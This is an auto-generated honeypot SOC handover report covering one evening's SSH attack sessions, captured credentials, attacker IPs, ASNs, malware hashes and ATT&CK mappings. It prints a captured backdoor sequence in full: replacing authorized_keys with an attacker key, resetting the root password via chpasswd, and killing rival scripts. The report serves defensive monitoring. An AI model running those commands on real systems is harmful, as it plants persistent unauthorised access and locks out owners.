# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-22 |
| **Generated At** | 2026-03-22T20:25:07Z |
| **Shift Time** | 20:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **44** |
| Confirmed Threats | **43** |
| False Positives Filtered | **1** (2.3%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **10** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **41** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **26** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **23** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `guest` | 2 |
| `ubnt` | 1 |
| `support` | 1 |
| `kafka` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 3 |
| `Guest2000` | 1 |
| `qwerty1234` | 1 |
| `7` | 1 |
| `root12345678` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `guest` | `Guest2000` | 1 |
| `ubnt` | `qwerty1234` | 1 |
| `support` | `7` | 1 |
| `root` | `root12345678` | 1 |
| `kafka` | `kafkakafka` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root12345678` | `61.145.181.7` | 2026-03-22T18:54:48 |
| `root` | `123!@#QWE` | `180.184.176.74` | 2026-03-22T19:21:52 |
| `root` | `root2023` | `112.102.48.217` | 2026-03-22T19:49:22 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:vqKttDzuyI2B"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.184.176.74`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **15** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS3320` | Deutsche Telekom AG | 1 | HIGH |
| `AS9230` | Bangladesh Online Ltd. | 1 | HIGH |
| `AS12684` | SES ASTRA S.A. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7c1ca969a32e

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-03-22 18:54 |
| **Last Seen** | 2026-03-22 18:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 18:54:46` | `cowrie.session.connect` |
| `2026-03-22 18:54:46` | `cowrie.client.version` |
| `2026-03-22 18:54:46` | `cowrie.client.kex` |
| `2026-03-22 18:54:48` | `cowrie.login.success` |
| `2026-03-22 18:54:49` | `cowrie.direct-tcpip.request` |
| `2026-03-22 18:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a21bc701129

| Field | Detail |
|---|---|
| **Source IP** | `180.184.176[.]74` |
| **First Seen** | 2026-03-22 19:21 |
| **Last Seen** | 2026-03-22 19:22 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vqKttDzuyI2B"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 19:21:51` | `cowrie.session.connect` |
| `2026-03-22 19:21:51` | `cowrie.client.version` |
| `2026-03-22 19:21:52` | `cowrie.client.kex` |
| `2026-03-22 19:21:52` | `cowrie.login.success` |
| `2026-03-22 19:21:53` | `cowrie.session.params` |
| `2026-03-22 19:21:53` | `cowrie.command.input` |
| `2026-03-22 19:21:53` | `cowrie.command.failed` |
| `2026-03-22 19:21:54` | `cowrie.log.closed` |
| `2026-03-22 19:21:54` | `cowrie.session.params` |
| `2026-03-22 19:21:54` | `cowrie.command.input` |
| `2026-03-22 19:21:54` | `cowrie.session.file_download` |
| `2026-03-22 19:21:54` | `cowrie.log.closed` |
| `2026-03-22 19:22:02` | `cowrie.session.params` |
| `2026-03-22 19:22:02` | `cowrie.command.input` |
| `2026-03-22 19:22:03` | `cowrie.log.closed` |
| `2026-03-22 19:22:03` | `cowrie.session.params` |
| `2026-03-22 19:22:03` | `cowrie.command.input` |
| `2026-03-22 19:22:03` | `cowrie.log.closed` |
| `2026-03-22 19:22:03` | `cowrie.session.params` |
| `2026-03-22 19:22:03` | `cowrie.command.input` |
| `2026-03-22 19:22:04` | `cowrie.session.file_download` |
| `2026-03-22 19:22:04` | `cowrie.log.closed` |
| `2026-03-22 19:22:04` | `cowrie.session.params` |
| `2026-03-22 19:22:04` | `cowrie.command.input` |
| `2026-03-22 19:22:04` | `cowrie.log.closed` |
| `2026-03-22 19:22:04` | `cowrie.session.params` |
| `2026-03-22 19:22:04` | `cowrie.command.input` |
| `2026-03-22 19:22:05` | `cowrie.log.closed` |
| `2026-03-22 19:22:05` | `cowrie.session.params` |
| `2026-03-22 19:22:05` | `cowrie.command.input` |
| `2026-03-22 19:22:05` | `cowrie.command.input` |
| `2026-03-22 19:22:05` | `cowrie.log.closed` |
| `2026-03-22 19:22:05` | `cowrie.session.params` |
| `2026-03-22 19:22:05` | `cowrie.command.input` |
| `2026-03-22 19:22:05` | `cowrie.log.closed` |
| `2026-03-22 19:22:06` | `cowrie.session.params` |
| `2026-03-22 19:22:06` | `cowrie.command.input` |
| `2026-03-22 19:22:06` | `cowrie.log.closed` |
| `2026-03-22 19:22:06` | `cowrie.session.params` |
| `2026-03-22 19:22:06` | `cowrie.command.input` |
| `2026-03-22 19:22:06` | `cowrie.log.closed` |
| `2026-03-22 19:22:07` | `cowrie.session.params` |
| `2026-03-22 19:22:07` | `cowrie.command.input` |
| `2026-03-22 19:22:07` | `cowrie.log.closed` |
| `2026-03-22 19:22:07` | `cowrie.session.params` |
| `2026-03-22 19:22:07` | `cowrie.command.input` |
| `2026-03-22 19:22:07` | `cowrie.log.closed` |
| `2026-03-22 19:22:08` | `cowrie.session.params` |
| `2026-03-22 19:22:08` | `cowrie.command.input` |
| `2026-03-22 19:22:08` | `cowrie.log.closed` |
| `2026-03-22 19:22:08` | `cowrie.session.params` |
| `2026-03-22 19:22:08` | `cowrie.command.input` |
| `2026-03-22 19:22:08` | `cowrie.log.closed` |
| `2026-03-22 19:22:08` | `cowrie.session.params` |
| `2026-03-22 19:22:08` | `cowrie.command.input` |
| `2026-03-22 19:22:09` | `cowrie.log.closed` |
| `2026-03-22 19:22:09` | `cowrie.session.params` |
| `2026-03-22 19:22:09` | `cowrie.command.input` |
| `2026-03-22 19:22:09` | `cowrie.log.closed` |
| `2026-03-22 19:22:09` | `cowrie.session.params` |
| `2026-03-22 19:22:09` | `cowrie.command.input` |
| `2026-03-22 19:22:10` | `cowrie.log.closed` |
| `2026-03-22 19:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.176[.]74` to AbuseIPDB if not already reported
- [ ] Block `180.184.176[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94451681d8d6

| Field | Detail |
|---|---|
| **Source IP** | `112.102.48[.]217` |
| **First Seen** | 2026-03-22 19:49 |
| **Last Seen** | 2026-03-22 19:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 19:49:19` | `cowrie.session.connect` |
| `2026-03-22 19:49:20` | `cowrie.client.version` |
| `2026-03-22 19:49:20` | `cowrie.client.kex` |
| `2026-03-22 19:49:22` | `cowrie.login.success` |
| `2026-03-22 19:49:23` | `cowrie.direct-tcpip.request` |
| `2026-03-22 19:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.102.48[.]217` to AbuseIPDB if not already reported
- [ ] Block `112.102.48[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `49.0.194[.]167` | **15** | 2026-03-22 19:12 | 2026-03-22 19:45 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.176[.]74` | **6** | 2026-03-22 19:16 | 2026-03-22 19:25 | 6m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.217.102[.]23` | **3** | 2026-03-22 18:53 | 2026-03-22 18:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.180.157[.]167` | **2** | 2026-03-22 19:45 | 2026-03-22 19:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.49[.]180` | 1 | 2026-03-22 18:40 | 2026-03-22 18:40 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.204.156[.]167` | 1 | 2026-03-22 20:22 | 2026-03-22 20:23 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-03-22 19:13 | 2026-03-22 19:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.57[.]208` | 1 | 2026-03-22 19:14 | 2026-03-22 19:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]211` | 1 | 2026-03-22 20:15 | 2026-03-22 20:15 | 5s | 0 | `T1592` | 🟢 LOW |
| `183.56.179[.]201` | 1 | 2026-03-22 19:13 | 2026-03-22 19:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.28.226[.]124` | 1 | 2026-03-22 19:01 | 2026-03-22 19:01 | 3s | 0 | `T1592` | 🟢 LOW |
| `202.84.34[.]85` | 1 | 2026-03-22 19:57 | 2026-03-22 19:57 | 35s | 0 | `T1592` | 🟢 LOW |
| `203.129.225[.]4` | 1 | 2026-03-22 18:36 | 2026-03-22 18:36 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `216.236.215[.]5` | 1 | 2026-03-22 19:35 | 2026-03-22 19:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `221.120.4[.]61` | 1 | 2026-03-22 18:43 | 2026-03-22 18:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.235.64[.]126` | 1 | 2026-03-22 19:53 | 2026-03-22 19:53 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-22 18:46 | 2026-03-22 18:47 | 81s | 0 | `T1592` | 🟢 LOW |
| `93.241.232[.]14` | 1 | 2026-03-22 20:07 | 2026-03-22 20:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `18.217.102[.]23` | US | Amazon Technologies Inc. | **100** ⚠️ | 3 |
| `183.171.61[.]211` | MY | Celcom Axiata Berhad | **100** ⚠️ | 4 |
| `221.120.4[.]61` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 13 |
| `183.56.179[.]201` | CN | CHINANET Guangdong province network | **100** ⚠️ | 46 |
| `93.241.232[.]14` | DE | Deutsche Telekom AG | **100** ⚠️ | 50 |
| `196.28.226[.]124` | MZ | TMCEL - Moçambique Telecom, SA | **100** ⚠️ | 35 |
| `61.145.181[.]7` | CN | CHINANET Guangdong Province Network | **100** ⚠️ | 50 |
| `223.235.64[.]126` | IN | ABTS DELHI, | **100** ⚠️ | 33 |
| `52.180.157[.]167` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `111.70.49[.]180` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 29 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 44 cases |
| Tool 34  | Credential Extractor        | ✅ 26 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (2.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 18 recon entry/entries in table (4 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-22T20:25:07Z_
